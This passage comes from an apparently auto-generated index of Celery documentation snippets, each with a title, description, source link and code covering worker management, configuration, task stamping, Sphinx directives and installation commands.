ps/awk/kill combination.\nSOURCE: https://github.com/celery/celery/blob/main/docs/faq.rst#2025-04-23_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n$ pkill 'celery worker'\n\n$ # - If you don't have pkill use:\n$ # ps auxww | awk '/celery worker/ {print $2}' | xargs kill\n```\n\nLANGUAGE: console\nCODE:\n```\n$ pkill -9 'celery worker'\n\n$ # - If you don't have pkill use:\n$ # ps auxww | awk '/celery worker/ {print $2}' | xargs kill -9\n```\n\n----------------------------------------\n\nTITLE: Autogenerating Module Documentation with Sphinx\nDESCRIPTION: This reStructuredText snippet uses the Sphinx `automodule` directive to automatically generate documentation for the `celery.worker.worker` module. The `:members:` option includes documented members, and `:undoc-members:` includes members without docstrings. Requires the `sphinx.ext.autodoc` extension and the target module to be importable.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.worker.worker.rst#2025-04-23_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n.. automodule:: celery.worker.worker\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Inspecting Unbound Task and Decorator Usage in Python REPL\nDESCRIPTION: Demonstrates inspecting an unbound abstract Celery task (`DebugTask`) in a Python REPL, showing '<unbound DebugTask>'. It then shows how to create a concrete task `add` using the `@celery1.task` decorator with the abstract task as its `base`, illustrating the lazy binding mechanism where the task becomes bound upon definition with a specific app instance. Requires a Celery app instance (e.g., `celery1`) and the previously defined `DebugTask`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_20\n\nLANGUAGE: pycon\nCODE:\n```\n>>> DebugTask\n<unbound DebugTask>\n\n>>> @celery1.task(base=DebugTask)\n... def add(x, y):\n...     return x + y\n>>> add.__class__\n<class add of <Celery default:0x101510d10>>\n```\n\n----------------------------------------\n\nTITLE: Celery Configuration Settings\nDESCRIPTION: Demonstrates new configuration settings for Celery v5.5.0 including worker_soft_shutdown_timeout, worker_enable_soft_shutdown_on_idle, broker_native_delayed_delivery_queue_type, task_default_queue_type, and worker_detect_quorum_queues.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-5.5.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\n# Worker shutdown settings\nworker_soft_shutdown_timeout = 300  # Time in seconds\nworker_enable_soft_shutdown_on_idle = True\n\n# Queue and broker settings\nbroker_native_delayed_delivery_queue_type = 'quorum'\ntask_default_queue_type = 'quorum'\nworker_detect_quorum_queues = True\n```\n\n----------------------------------------\n\nTITLE: Implementing a Custom Stamping Visitor in Python\nDESCRIPTION: Defines a custom stamping visitor class 'InGroupVisitor' that labels tasks within a group. It demonstrates how to implement custom stamping logic.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_71\n\nLANGUAGE: python\nCODE:\n```\nclass InGroupVisitor(StampingVisitor):\n    def __init__(self):\n        self.in_group = False\n\n    def on_group_start(self, group, **headers) -> dict:\n        self.in_group = True\n        return {\"in_group\": [self.in_group], \"stamped_headers\": [\"in_group\"]}\n\n    def on_group_end(self, group, **headers) -> None:\n        self.in_group = False\n\n    def on_chain_start(self, chain, **headers) -> dict:\n        return {\"in_group\": [self.in_group], \"stamped_headers\": [\"in_group\"]}\n\n    def on_signature(self, sig, **headers) -> dict:\n        return {\"in_group\": [self.in_group], \"stamped_headers\": [\"in_group\"]}\n```\n\n----------------------------------------\n\nTITLE: Task Magic Keyword Arguments Migration\nDESCRIPTION: Shows migration from old-style magic keyword arguments to new bound task syntax with request context.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_26\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.decorators import task\n\n@task()\ndef add(x, y, task_id=None):\n    print('My task id is %r' % (task_id,))\n```\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import task\n\n@task(bind=True)\ndef add(self, x, y):\n    print('My task id is {0.request.id}'.format(self))\n```\n\n----------------------------------------\n\nTITLE: Worker Log Output Showing Task Result After Remote Debugging\nDESCRIPTION: This text snippet displays the Celery worker log entry confirming the successful completion of the `tasks.add` task. Critically, it shows the task's return value reflects the modification ('hello from rdb') made during the remote debugging session shown in the previous snippet.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/debugging.rst#2025-04-23_snippet_4\n\nLANGUAGE: text\nCODE:\n```\n[2011-01-18 14:35:36,599: INFO/MainProcess] Task\n    tasks.add[d7261c71-4962-47e5-b342-2448bedd20e8] succeeded\n    in 61.481s: 'hello from rdb'\n```\n\n----------------------------------------\n\nTITLE: Initializing Celery Application Instance in Python\nDESCRIPTION: Creates a new Celery application instance, which is required for the new Celery API introduced in 3.0\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Celery\n\napp = Celery()\n```\n\n----------------------------------------\n\nTITLE: Querying Celery Task Status via HTTP API - Shell\nDESCRIPTION: This snippet shows a curl command to query the status and result of a previously submitted Celery task using its ID. The Django HTTP gateway must be operational. The input is the task ID in the URL path; output is a JSON object with status, result, and task ID information.\nSOURCE: https://github.com/celery/celery/blob/main/examples/celery_http_gateway/README.rst#2025-04-23_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ curl http://localhost:8000/e3a95109-afcd-4e54-a341-16c18fddf64b/status/\n{\"task\": {\"status\": \"SUCCESS\", \"result\": \"pong\", \"id\": \"e3a95109-afcd-4e54-a341-16c18fddf64b\"}}\n```\n\n----------------------------------------\n\nTITLE: Altering PostgreSQL Table for NULL Result\nDESCRIPTION: SQL command to modify the 'celery_taskmeta' table in PostgreSQL to allow NULL values in the result column. Required due to changes in django-picklefield.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nALTER TABLE celery_taskmeta ALTER COLUMN result DROP NOT NULL\n```\n\n----------------------------------------\n\nTITLE: Running All Celery Unit Tests (Console)\nDESCRIPTION: Provides the command to execute the complete Celery unit test suite using the `nosetests` runner. Assumes test requirements have been installed and the environment is configured.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_15\n\nLANGUAGE: console\nCODE:\n```\n$ nosetests\n```\n\n----------------------------------------\n\nTITLE: Creating Log and Run Directories for Celery with systemd-tmpfiles - Bash\nDESCRIPTION: Shows the use of systemd-tmpfiles configuration to create persistent runtime and log directories for Celery owned by the 'celery' user and group. Place this file in /etc/tmpfiles.d/celery.conf. Directories created: /run/celery and /var/log/celery. No parameters; outputs system directories with proper ownership and permissions.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/daemonizing.rst#2025-04-23_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\nd /run/celery 0755 celery celery -\nd /var/log/celery 0755 celery celery -\n```\n\n----------------------------------------\n\nTITLE: Using Celery Graph Command for Bootstep and Worker Visualization - Console\nDESCRIPTION: Demonstrates usage of the 'celery graph' CLI to generate visualizations (in GraphViz dot format) of Celery bootsteps and worker clusters. Requires Celery and GraphViz installed. Key parameters include 'bootsteps', namespaces (consumer/worker), and specific worker nodes with possible thread/broker/backend customization. Input: CLI options; Output: dot/png graphs.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_15\n\nLANGUAGE: console\nCODE:\n```\n# Create graph of currently installed bootsteps in both the worker\n# and consumer name-spaces.\n$ celery graph bootsteps | dot -T png -o steps.png\n\n# Graph of the consumer name-space only.\n$ celery graph bootsteps consumer | dot -T png -o consumer_only.png\n\n# Graph of the worker name-space only.\n$ celery graph bootsteps worker | dot -T png -o worker_only.png\n```\n\nLANGUAGE: console\nCODE:\n```\n# Create graph from the current cluster\n$ celery graph workers | dot -T png -o workers.png\n\n# Create graph from a specified list of workers\n$ celery graph workers nodes:w1,w2,w3 | dot -T png workers.png\n\n# also specify the number of threads in each worker\n$ celery graph workers nodes:w1,w2,w3 threads:2,4,6\n\n# …also specify the broker and backend URLs shown in the graph\n$ celery graph workers broker:amqp:// backend:redis://\n\n# …also specify the max number of workers/threads shown (wmax/tmax),\n# enumerating anything that exceeds that number.\n$ celery graph workers wmax:10 tmax:3\n```\n\n----------------------------------------\n\nTITLE: Configuring Task with Disabled Event Sending in Python\nDESCRIPTION: Example of defining a Celery task with the send_events option set to False to disable sending of events for that specific task. This allows for per-task control of event emission.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.1.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n@app.task(send_events=False)\ndef add(x, y):\n    return x + y\n```\n\n----------------------------------------\n\nTITLE: Configuring New Celery Custom Carrot Backend (v0.8.1+) in Python\nDESCRIPTION: This snippet demonstrates the updated way (from Celery v0.8.1 onwards) to configure a custom Carrot messaging backend. Unlike the previous method, it requires specifying the full Python path including the backend class name (e.g., `Backend`) within the module. This change provides more explicitness and flexibility.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_14\n\nLANGUAGE: python\nCODE:\n```\nCARROT_BACKEND = 'mycustom.backend.module.Backend'\n```\n\n----------------------------------------\n\nTITLE: Handling Keyword Arguments in Pickleable Exceptions\nDESCRIPTION: Demonstrates how to properly handle keyword arguments in pickleable exceptions by passing them as regular arguments to the parent Exception class constructor.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_31\n\nLANGUAGE: python\nCODE:\n```\nclass HttpError(Exception):\n\n    def __init__(self, status_code, headers=None, body=None):\n        self.status_code = status_code\n        self.headers = headers\n        self.body = body\n\n        super(HttpError, self).__init__(status_code, headers, body)\n```\n\n----------------------------------------\n\nTITLE: Accessing Celery Attributes and Features in Python\nDESCRIPTION: Demonstrates how to access various Celery attributes and features, including broker connection, AMQP features, loader, and default backend.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/app-overview.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\n# Establish broker connection.\n>>> celery.broker_connection()\n\n# AMQP Specific features.\n>>> celery.amqp\n>>> celery.amqp.Router\n>>> celery.amqp.get_queues()\n>>> celery.amqp.get_task_consumer()\n\n# Loader\n>>> celery.loader\n\n# Default backend\n>>> celery.backend\n```\n\n----------------------------------------\n\nTITLE: Implementing a Monitoring ID Stamping Visitor in Python\nDESCRIPTION: Defines a custom stamping visitor 'MonitoringIdStampingVisitor' that adds a unique monitoring ID to each task. This can be used for external tracking systems.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_72\n\nLANGUAGE: python\nCODE:\n```\nclass MonitoringIdStampingVisitor(StampingVisitor):\n    def on_signature(self, sig, **headers) -> dict:\n        return {'monitoring_id': uuid4().hex}\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery Soft Shutdown for Idle Workers\nDESCRIPTION: This boolean configuration setting controls whether the Soft Shutdown mechanism is activated even when a worker is idle upon receiving the shutdown signal. If False (default), an idle worker proceeds directly to cold shutdown, skipping the soft shutdown timeout.\nSOURCE: https://github.com/celery/celery/blob/main/Changelog.rst#2025-04-23_snippet_4\n\nLANGUAGE: Configuration\nCODE:\n```\n:setting:`worker_enable_soft_shutdown_on_idle`\n```\n\n----------------------------------------\n\nTITLE: Enabling Celery App Trap for Testing in Python\nDESCRIPTION: This fixture enables the 'app trap' mechanism, which raises an exception if something tries to access the default or current Celery app. It's designed to be overridden in the conftest.py file.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/testing.rst#2025-04-23_snippet_17\n\nLANGUAGE: Python\nCODE:\n```\n@pytest.fixture(scope='session')\ndef use_celery_app_trap():\n    return True\n```\n\n----------------------------------------\n\nTITLE: Router Return Value Example in Celery Python\nDESCRIPTION: Shows what a router might return, which will be merged with task options where task settings have priority.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_41\n\nLANGUAGE: python\nCODE:\n```\n{'immediate': True, 'exchange': 'urgent'}\n```\n\n----------------------------------------\n\nTITLE: Task Subscription with Celery TaskSetResult\nDESCRIPTION: Demonstrates how to use subscription syntax with TaskSetResult to access individual task results.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.1.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\n>>> res = TaskSet(tasks).apply_async()\n>>> res[0].get()\n```\n\n----------------------------------------\n\nTITLE: Configuring Sphinx Autodoc for celery.bin.worker\nDESCRIPTION: These Sphinx reStructuredText directives configure the documentation generation process. `.. contents:: :local:` creates a local table of contents. `.. currentmodule:: celery.bin.worker` sets the default module for subsequent directives. `.. automodule:: celery.bin.worker :members: :undoc-members:` instructs Sphinx's autodoc extension to automatically pull documentation from the specified Python module, including all members and those without docstrings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.bin.worker.rst#2025-04-23_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. contents::\n    :local:\n.. currentmodule:: celery.bin.worker\n\n.. automodule:: celery.bin.worker\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Correcting pip install command for Celery with SQS extras (Shell)\nDESCRIPTION: Provides the corrected shell command to install the Celery package along with its SQS (Simple Queue Service) dependencies. The quotes are necessary in some shells to prevent interpretation of the square brackets.\nSOURCE: https://github.com/celery/celery/blob/main/Changelog.rst#2025-04-23_snippet_11\n\nLANGUAGE: shell\nCODE:\n```\npip install \"celery[sqs]\"\n```\n\n----------------------------------------\n\nTITLE: Displaying General Celery CLI Help\nDESCRIPTION: Shows the available commands and options for the Celery command-line interface. This is useful for discovering available functionalities.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n$ celery --help\n```\n\n----------------------------------------\n\nTITLE: Setting CELERY_TRACE_APP Environment Variable\nDESCRIPTION: Demonstrates how to set the CELERY_TRACE_APP environment variable to debug app chain breaks in Celery.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_20\n\nLANGUAGE: console\nCODE:\n```\n$ CELERY_TRACE_APP=1 celery worker -l INFO\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery Routes in Python\nDESCRIPTION: Example of setting up task routing configuration using CELERY_ROUTES setting to direct specific tasks to named queues.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nCELERY_ROUTES = {'feed.tasks.import_feed': 'feeds'}\n```\n\n----------------------------------------\n\nTITLE: Installing Celery with Environment-specific Values - Shell\nDESCRIPTION: This snippet shows how to use a customized values YAML file (e.g., values_dev.yaml) to override the default configuration during Celery Helm chart installation. The --values flag specifies the path to the environment-specific configuration. Requires helm CLI and cluster context; intended for parameterizing installations for dev, staging, or prod.\nSOURCE: https://github.com/celery/celery/blob/main/helm-chart/README.rst#2025-04-23_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nhelm install celery helm-chart/ --values helm-chart/values_dev.yaml\n```\n\n----------------------------------------\n\nTITLE: Configuring Cache Backend Options in Celery\nDESCRIPTION: Example of setting pylibmc options using the cache_backend_options setting.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_19\n\nLANGUAGE: python\nCODE:\n```\ncache_backend_options = {\n    'binary': True,\n    'behaviors': {'tcp_nodelay': True},\n}\n```\n\n----------------------------------------\n\nTITLE: Using Task Shortcut Syntax in Celery\nDESCRIPTION: Demonstrates the shortcut syntax for creating subtasks in Celery, using the .s() method instead of the more verbose subtask() method.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_5\n\nLANGUAGE: pycon\nCODE:\n```\n>>> task.s(arg1, arg2, kw=1)\n```\n\nLANGUAGE: pycon\nCODE:\n```\n>>> task.subtask((arg1, arg2), {'kw': 1})\n```\n\n----------------------------------------\n\nTITLE: Overriding Concurrency for Named Workers with `celeryd-multi` (Console)\nDESCRIPTION: Demonstrates overriding a default option (concurrency `-c 3`) for a specifically named worker (`image`) using the syntax `-c:image 10` when starting named workers (`image`, `video`, `data`) with `celeryd-multi`. The output shows the `celeryd` commands where the 'image' worker has 10 processes.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_23\n\nLANGUAGE: console\nCODE:\n```\n$ celeryd-multi start image video data -c 3 -c:image 10\nceleryd -n image.myhost -c 10\nceleryd -n video.myhost -c 3\nceleryd -n data.myhost -c 3\n```\n\n----------------------------------------\n\nTITLE: Worker-offline Event Signature in Celery\nDESCRIPTION: Signature definition for the worker-offline event that is sent when a worker disconnects from the broker. Includes worker identification and system information parameters.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_38\n\nLANGUAGE: python\nCODE:\n```\nworker-offline(hostname, timestamp, freq, sw_ident, sw_ver, sw_sys)\n```\n\n----------------------------------------\n\nTITLE: Deleting Old Celery Exchange Names with AMQP Command\nDESCRIPTION: Code snippet demonstrating how to manually delete old Celery exchange names using the 'celery amqp' command. This is necessary due to the renaming of worker remote control command exchanges in Celery 3.0.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ celery amqp exchange.delete celeryd.pidbox\n$ celery amqp exchange.delete reply.celeryd.pidbox\n```\n\n----------------------------------------\n\nTITLE: Running a Single Celery Task Asynchronously (Python)\nDESCRIPTION: This Python code demonstrates how to run the `urlopen` Celery task asynchronously from an interactive Python session within the `examples/gevent` directory. It imports the task, invokes it with a specific URL using `.delay()`, and then waits for the task to complete and retrieves its return value (the size of the response body) using `.get()`. Assumes a Celery worker is active.\nSOURCE: https://github.com/celery/celery/blob/main/examples/gevent/README.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n# Run from: $ cd examples/gevent\n#           $ python\n>>> from tasks import urlopen\n>>> urlopen.delay('https://www.google.com/').get()\n9980\n```\n\n----------------------------------------\n\nTITLE: Using Custom Stamping Visitors with Celery Tasks in Python\nDESCRIPTION: Demonstrates how to apply custom stamping visitors to various Celery task structures including signatures, groups, chords, and chains.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_73\n\nLANGUAGE: python\nCODE:\n```\nsig_example = signature('t1')\nsig_example.stamp(visitor=MonitoringIdStampingVisitor())\n\ngroup_example = group([signature('t1'), signature('t2')])\ngroup_example.stamp(visitor=MonitoringIdStampingVisitor())\n\nchord_example = chord([signature('t1'), signature('t2')], signature('t3'))\nchord_example.stamp(visitor=MonitoringIdStampingVisitor())\n\nchain_example = chain(signature('t1'), group(signature('t2'), signature('t3')), signature('t4'))\nchain_example.stamp(visitor=MonitoringIdStampingVisitor())\n```\n\n----------------------------------------\n\nTITLE: Installing ZSTD Compression for Celery\nDESCRIPTION: Command to install Celery with ZSTD compression support.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_20\n\nLANGUAGE: console\nCODE:\n```\n$ pip install celery[zstd]\n```\n\n----------------------------------------\n\nTITLE: Starting the Celery Events Curses Monitor\nDESCRIPTION: Launches the `celery events` command, which provides a text-based (curses) interface for monitoring task and worker history in the terminal. Requires the Celery application instance (`-A proj`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_26\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj events\n```\n\n----------------------------------------\n\nTITLE: Installing Python Dependencies using pip (Console)\nDESCRIPTION: Installs required Python packages specified in the `requirements.txt` file using the `pip` package installer. Assumes `pip` is installed and the requirements file exists in the current directory.\nSOURCE: https://github.com/celery/celery/blob/main/examples/django/README.rst#2025-04-23_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n$ pip install -r requirements.txt\n```\n\n----------------------------------------\n\nTITLE: Auto-Documenting Python Module with Sphinx\nDESCRIPTION: Uses the Sphinx `.. automodule::` directive to automatically generate documentation for the `celery.bin.call` Python module by introspecting its source code and docstrings. The `:members:` option ensures all public members are included, and `:undoc-members:` includes members even if they lack docstrings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.bin.call.rst#2025-04-23_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n.. automodule:: celery.bin.call\n    :members:\n    :undoc-members:\n```\n\n----------------------------------------\n\nTITLE: Installing Celery from Source\nDESCRIPTION: This snippet shows the steps to download and install Celery from source. It includes extracting the tarball, building, and installing the package.\nSOURCE: https://github.com/celery/celery/blob/main/README.rst#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ tar xvfz celery-0.0.0.tar.gz\n$ cd celery-0.0.0\n$ python setup.py build\n# python setup.py install\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery RPC Backend\nDESCRIPTION: Configuration settings for enabling RPC result backend with persistence\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nCELERY_RESULT_BACKEND = 'rpc'\nCELERY_RESULT_PERSISTENT = True\n```\n\n----------------------------------------\n\nTITLE: Handling LZMA Import Error in Python\nDESCRIPTION: Example showing LZMA import error when Python is not compiled with LZMA support. Includes solution to install LZMA via pip.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_18\n\nLANGUAGE: python\nCODE:\n```\n>>> import lzma\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nImportError: No module named 'lzma'\n```\n\nLANGUAGE: console\nCODE:\n```\n$ pip install celery[lzma]\n```\n\n----------------------------------------\n\nTITLE: Starting Multiple Celery Workers with `celeryd-multi` (Console)\nDESCRIPTION: Shows how to use `celeryd-multi` to start a specified number of workers (3 in this example), each configured with a concurrency level of 3 processes (`-c 3`). The output displays the individual `celeryd` commands generated for each worker, including default naming conventions.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_19\n\nLANGUAGE: console\nCODE:\n```\n$ celeryd-multi start 3 -c 3\nceleryd -n celeryd1.myhost -c 3\nceleryd -n celeryd2.myhost -c 3\nceleryd -n celeryd3.myhost -c 3\n```\n\n----------------------------------------\n\nTITLE: Positioning Global Options in Celery 5.0 CLI\nDESCRIPTION: Example showing the new required syntax for Celery 5.0 CLI, where global options must be positioned before the sub-command rather than after it.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-5.0.rst#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncelery --app path.to.app worker\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Result Backend with Global Keyprefix\nDESCRIPTION: Setting up Redis as result backend with custom key prefix\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/redis.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\napp.conf.result_backend_transport_options = {\n    'global_keyprefix': 'my_prefix_'\n}\n```\n\n----------------------------------------\n\nTITLE: Fixing Race Condition in Article Abbreviation Expansion Task\nDESCRIPTION: This snippet demonstrates how to fix the race condition by passing the article ID instead of the article object, and re-fetching the article within the task.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_48\n\nLANGUAGE: python\nCODE:\n```\n@app.task\ndef expand_abbreviations(article_id):\n    article = Article.objects.get(id=article_id)\n    article.body.replace('MyCorp', 'My Corporation')\n    article.save()\n\n>>> expand_abbreviations.delay(article_id)\n```\n\n----------------------------------------\n\nTITLE: Upgrading Celery to 2.3.4 using pip or easy_install (Bash)\nDESCRIPTION: Shell commands to upgrade the Celery package specifically to version 2.3.4 using either `pip` or `easy_install`. This patches the CELERYSA-0001 vulnerability for users running the Celery 2.3 series. Requires Python package management tools (`pip` or `easy_install`) to be installed.\nSOURCE: https://github.com/celery/celery/blob/main/docs/sec/CELERYSA-0001.txt#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\npip install -U celery==2.3.4\n```\n\nLANGUAGE: bash\nCODE:\n```\neasy_install -U celery==2.3.4\n```\n\n----------------------------------------\n\nTITLE: Inheriting User Environment in 'celeryd' via Login Shell\nDESCRIPTION: Demonstrates setting the `CELERYD_SU_ARGS` variable to `-l` within the `/etc/default/celeryd` configuration file. This configuration passes the `-l` flag to the `su` command used internally by the init script, causing it to start a login shell for the specified `CELERYD_USER`. This allows the Celery worker process to inherit the full environment of that user, although this approach is generally not recommended.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/daemonizing.rst#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nCELERYD_SU_ARGS=\"-l\"\n```\n\n----------------------------------------\n\nTITLE: Applying Custom Stamping Visitor to a Chord with Callbacks in Python\nDESCRIPTION: Shows how to apply a custom stamping visitor to a chord structure with callbacks and errbacks, demonstrating implicit stamping of linked callbacks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_75\n\nLANGUAGE: python\nCODE:\n```\nc = chord([add.s(1, 1), add.s(2, 2)], xsum.s())\ncallback = signature('sig_link')\nerrback = signature('sig_link_error')\nc.link(callback)\nc.link_error(errback)\nc.stamp(visitor=CustomStampingVisitor())\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies for Celery Gevent Example (Shell)\nDESCRIPTION: This command installs the required Python libraries `gevent`, `celery`, and `pybloom-live` using pip. These dependencies are necessary to run the Celery example tasks with the gevent execution pool.\nSOURCE: https://github.com/celery/celery/blob/main/examples/gevent/README.rst#2025-04-23_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ python -m pip install gevent celery pybloom-live\n```\n\n----------------------------------------\n\nTITLE: Task-retried Event Signature in Celery\nDESCRIPTION: Signature definition for the task-retried event that is sent when a task fails but will be retried later. Includes parameters for the task UUID, exception details, traceback, hostname, and timestamp.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_35\n\nLANGUAGE: python\nCODE:\n```\ntask-retried(uuid, exception, traceback, hostname, timestamp)\n```\n\n----------------------------------------\n\nTITLE: Installing Celery development version with pip\nDESCRIPTION: Series of pip commands to install the latest development versions of Celery and its dependencies (kombu, amqp, billiard, and vine) directly from GitHub repositories.\nSOURCE: https://github.com/celery/celery/blob/main/docs/includes/installation.txt#2025-04-23_snippet_3\n\nLANGUAGE: console\nCODE:\n```\n$ pip install https://github.com/celery/celery/zipball/main#egg=celery\n$ pip install https://github.com/celery/billiard/zipball/main#egg=billiard\n$ pip install https://github.com/celery/py-amqp/zipball/main#egg=amqp\n$ pip install https://github.com/celery/kombu/zipball/main#egg=kombu\n$ pip install https://github.com/celery/vine/zipball/main#egg=vine\n```\n\n----------------------------------------\n\nTITLE: Setting Current Module Context (Sphinx)\nDESCRIPTION: This reStructuredText directive sets the default Python module context for subsequent Sphinx autodoc directives within the document. Any following `autoclass`, `autofunction`, etc., directives will assume they belong to `celery.contrib.testing.mocks` unless explicitly specified otherwise.\nSOURCE: https://github.com/celery/celery/blob/main/docs/reference/celery.contrib.testing.mocks.rst#2025-04-23_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n.. currentmodule:: celery.contrib.testing.mocks\n```\n\n----------------------------------------\n\nTITLE: Example Log Message During Shutdown with Visibility Timeout\nDESCRIPTION: This example log message indicates that unacknowledged messages are being restored (re-queued). The Soft Shutdown mechanism facilitates this process, especially with brokers like Redis or SQS, by allowing time to reset visibility timeouts before the worker fully exits.\nSOURCE: https://github.com/celery/celery/blob/main/Changelog.rst#2025-04-23_snippet_5\n\nLANGUAGE: Log\nCODE:\n```\nRestoring 1 unacknowledged message(s)\n```\n\n----------------------------------------\n\nTITLE: Creating Pickleable Exceptions in Celery\nDESCRIPTION: Examples of properly implementing pickleable exceptions for Celery tasks. Shows correct and incorrect approaches to ensure exceptions can be serialized by the pickle module when raised in tasks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_30\n\nLANGUAGE: python\nCODE:\n```\n# OK:\nclass HttpError(Exception):\n    pass\n\n# BAD:\nclass HttpError(Exception):\n\n    def __init__(self, status_code):\n        self.status_code = status_code\n\n# OK:\nclass HttpError(Exception):\n\n    def __init__(self, status_code):\n        self.status_code = status_code\n        Exception.__init__(self, status_code)  # <-- REQUIRED\n```\n\n----------------------------------------\n\nTITLE: Specifying Test Dependencies with Conditional Requirements - Requirements Management - INI\nDESCRIPTION: This requirements file enumerates specific testing dependencies, using environment markers to apply the correct versions of packages (e.g., pytest-cov) based on the Python version in use. It includes direct dependencies as well as references to other requirements files (using '-r'). Key parameters include python_version conditions, which help maintain compatibility across different Python environments. There are no code execution inputs/outputs; this file serves as an input to pip or other Python dependency managers. Limitations may arise if referenced files are missing or if dependency conflicts exist.\nSOURCE: https://github.com/celery/celery/blob/main/requirements/test-ci-base.txt#2025-04-23_snippet_0\n\nLANGUAGE: INI\nCODE:\n```\npytest-cov==5.0.0; python_version<\"3.9\"\npytest-cov==6.0.0; python_version>=\"3.9\"\npytest-github-actions-annotate-failures==0.3.0\n-r extras/redis.txt\n-r extras/sqlalchemy.txt\n-r extras/pymemcache.txt\n-r extras/thread.txt\n-r extras/auth.txt\n```\n\n----------------------------------------\n\nTITLE: Installing Celery with Google Pub/Sub Support in Python\nDESCRIPTION: Command to install Celery with Google Pub/Sub dependencies using pip. 